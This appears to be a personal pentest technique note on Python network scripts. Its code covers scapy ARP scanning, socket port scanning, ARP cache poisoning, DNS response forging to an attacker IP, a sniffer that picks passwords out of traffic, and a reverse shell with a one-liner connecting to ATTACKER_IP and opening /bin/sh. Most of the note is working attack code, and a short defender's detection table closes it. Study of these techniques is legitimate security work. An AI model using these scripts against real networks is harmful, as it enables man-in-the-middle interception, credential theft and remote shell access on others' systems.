---
title: "Python Network Scripts"
created: 2026-11-17
type: technique
tags: [python, network, scripting, technique]
---

Python patterns for network discovery, scanning, and manipulation at Layer 2–4.

## ARP Scanning with `scapy`

Discover live hosts on a local subnet — more reliable than ICMP because devices can't ignore ARP without disconnecting from the network:

```python
from scapy.all import *

def arp_scan(ip_range, iface="eth0"):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range)
    answered, _ = srp(packet, timeout=2, iface=iface, inter=0.1, verbose=False)
    return [(rcv[ARP].psrc, rcv[Ether].src) for snd, rcv in answered]
```

- `srp()` sends/receives at Layer 2 (use `sr()` for Layer 3)
- `Ether(dst="ff:ff:ff:ff:ff:ff")` = broadcast to all devices
- `ARP(pdst=...)` accepts single IPs or CIDR ranges (`10.10.10.0/24`)
- Requires `sudo` — raw packet crafting needs root

## TCP Port Scanning with `socket`

Connect scan — Python's `socket` handles the full TCP three-way handshake:

```python
import socket

def port_scan(ip, ports, timeout=0.5):
    open_ports = []
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        if sock.connect_ex((ip, port)) == 0:  # 0 = success
            open_ports.append(port)
        sock.close()
    return open_ports
```

- `connect_ex()` returns 0 on success (no exception overhead — faster than `connect()` in a loop)
- `AF_INET` = IPv4, `SOCK_STREAM` = TCP
- For speed: thread the loop or use `asyncio` (sequential scanning is slow for 65k ports)
- `gethostbyname(hostname)` resolves DNS before scanning

### Common Service Ports

| Port | Service | Port | Service |
|------|---------|------|---------|
| 21 | FTP | 443 | HTTPS |
| 22 | SSH | 445 | SMB |
| 23 | Telnet | 3306 | MySQL |
| 25 | SMTP | 3389 | RDP |
| 53 | DNS | 5432 | PostgreSQL |
| 80 | HTTP | 8080 | HTTP Proxy |

## ARP Spoofing with `scapy`

MITM via ARP cache poisoning — tell the victim you're the gateway and vice versa:

```python
from scapy.all import *

def spoof(target_ip, spoof_ip):
    # Send ARP reply: "spoof_ip is at MY mac"
    packet = ARP(op=2, pdst=target_ip, hwdst=getmacbyip(target_ip), psrc=spoof_ip)
    send(packet, verbose=False)

def restore(target_ip, gateway_ip):
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    send(packet, count=4, verbose=False)
```

Enable IP forwarding: `echo 1 > /proc/sys/net/ipv4/ip_forward`

> See full implementation: [ARP_Spoofer](https://github.com/TroJan2001/Security-and-Ethical-Hacking/tree/main/ARP_Spoofer)

## DNS Spoofing with `scapy` + `netfilterqueue`

Intercept DNS queries and return forged responses:

```python
from scapy.all import *
from netfilterqueue import NetfilterQueue

def process_packet(packet):
    pkt = IP(packet.get_payload())
    if pkt.haslayer(DNSRR):  # DNS response
        # Modify the answer to point to attacker IP
        pkt[DNS].an = DNSRR(rrname=pkt[DNSQR].qname, rdata="ATTACKER_IP")
        del pkt[IP].len, pkt[IP].chksum
        del pkt[UDP].len, pkt[UDP].chksum
        packet.set_payload(bytes(pkt))
    packet.accept()
```

Requires iptables rule: `iptables -I FORWARD -j NFQUEUE --queue-num 0`

> See full implementation: [DNS_Spoofer](https://github.com/TroJan2001/Security-and-Ethical-Hacking/tree/main/DNS_Spoofer)

## Packet Sniffing with `scapy`

Capture and filter live traffic:

```python
from scapy.all import *

def sniff_callback(packet):
    if packet.haslayer(Raw):
        load = packet[Raw].load.decode(errors="ignore")
        keywords = ["username", "password", "login", "pass"]
        if any(kw in load.lower() for kw in keywords):
            print(f"[+] {packet[IP].src} -> {packet[IP].dst}")
            print(f"    {load}")

sniff(iface="eth0", store=False, prn=sniff_callback)
```

- `store=False` = don't keep packets in memory (critical for long captures)
- Filter with BPF: `sniff(filter="tcp port 80")`
- `packet.haslayer(HTTP)` / `packet.haslayer(DNS)` for protocol-specific filtering

> See full implementation: [PacketSniffer](https://github.com/TroJan2001/Security-and-Ethical-Hacking/tree/main/PacketSniffer)

## Reverse Shell (Python)

Minimal TCP reverse shell — connects back to attacker:

```python
import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("ATTACKER_IP", 4444))
os.dup2(s.fileno(), 0)  # stdin
os.dup2(s.fileno(), 1)  # stdout
os.dup2(s.fileno(), 2)  # stderr
subprocess.call(["/bin/sh", "-i"])
```

Catch with: `nc -lvnp 4444`

One-liner version:
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

## Defender's Perspective

| Attack | Detection |
|--------|-----------|
| ARP scanning | NIDS detects ARP storms; Dynamic ARP Inspection (DAI) on managed switches |
| Port scanning | Firewall logs sequential connection attempts; fail2ban blocks scanning IPs |
| ARP spoofing | Static ARP entries, DAI, monitoring for duplicate MAC addresses |
| DNS spoofing | DNSSEC validation, monitoring for mismatched DNS responses |
| Packet sniffing | Encrypted protocols (HTTPS, SSH), network segmentation |

## Related Notes

- [[Python Recon Scripts]] — web enumeration, downloads
- [[Python Exploitation Scripts]] — hash cracking, brute-force, Impacket
- [[Python Pentest Libraries]] — full library reference
